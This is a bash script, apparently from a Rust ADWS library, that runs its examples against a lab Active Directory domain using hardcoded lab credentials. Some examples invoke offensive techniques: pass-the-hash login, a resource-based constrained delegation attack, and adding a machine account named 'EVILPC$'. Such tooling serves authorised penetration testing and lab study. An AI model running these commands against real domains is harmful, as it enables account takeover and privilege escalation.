#!/usr/bin/env bash
# Run the adws examples (the commands from each example's header, uncommented).
# Comment out the ones you don't want. Run from the crate root: bash examples/test.sh

# smoke_connect
RUST_LOG=trace ADWS_HOST=meereen.essos.local ADWS_DOMAIN=essos.local \
ADWS_USER=daenerys.targaryen ADWS_PASS='BurnThemAll!' \
cargo run --example smoke_connect --features sspi-auth

# connect_username_password
RUST_LOG=trace ADWS_HOST=meereen.essos.local ADWS_DOMAIN=essos.local \
ADWS_USER=daenerys.targaryen ADWS_PASS='BurnThemAll!' \
cargo run --example connect_username_password --features "ldap3 sspi-auth"

# connect_pth
RUST_LOG=trace ADWS_HOST=meereen.essos.local ADWS_DOMAIN=essos.local \
ADWS_USER=daenerys.targaryen ADWS_NTHASH=<32 hex chars> \
cargo run --example connect_pth --features "ldap3 sspi-auth"

# connect_search
RUST_LOG=trace cargo run --example connect_search --features "ldap3 sspi-auth"

# env_search
RUST_LOG=trace ADWS_HOST=meereen.essos.local ADWS_DOMAIN=essos.local \
ADWS_USER=daenerys.targaryen ADWS_PASS='BurnThemAll!' \
ADWS_BASE='DC=essos,DC=local' ADWS_FILTER='(objectClass=user)' \
cargo run --example env_search --features "ldap3 sspi-auth"

# toggle_account
RUST_LOG=trace ADWS_HOST=meereen.essos.local ADWS_DOMAIN=essos.local \
ADWS_USER=daenerys.targaryen ADWS_PASS='BurnThemAll!' \
ADWS_TARGET=g0h4n \
cargo run --example toggle_account --features "sspi-auth"

# rbcd
RUST_LOG=trace ADWS_HOST=meereen.essos.local ADWS_DOMAIN=essos.local \
ADWS_USER=daenerys.targaryen ADWS_PASS='BurnThemAll!' \
ADWS_TARGET='BRAAVOS$' ADWS_ATTACKER=g0h4n \
cargo run --example rbcd --features sspi-auth

# add_computer
RUST_LOG=trace ADWS_HOST=meereen.essos.local ADWS_DOMAIN=essos.local \
ADWS_USER=daenerys.targaryen ADWS_PASS='BurnThemAll!' \
ADWS_COMPUTER='EVILPC$' ADWS_COMPUTER_PASS='Str0ngP@ss!' \
cargo run --example add_computer --features "sspi-auth"

# del_computer
RUST_LOG=trace ADWS_HOST=meereen.essos.local ADWS_DOMAIN=essos.local \
ADWS_USER=daenerys.targaryen ADWS_PASS='BurnThemAll!' \
ADWS_COMPUTER='EVILPC$' \
cargo run --example del_computer --features "sspi-auth"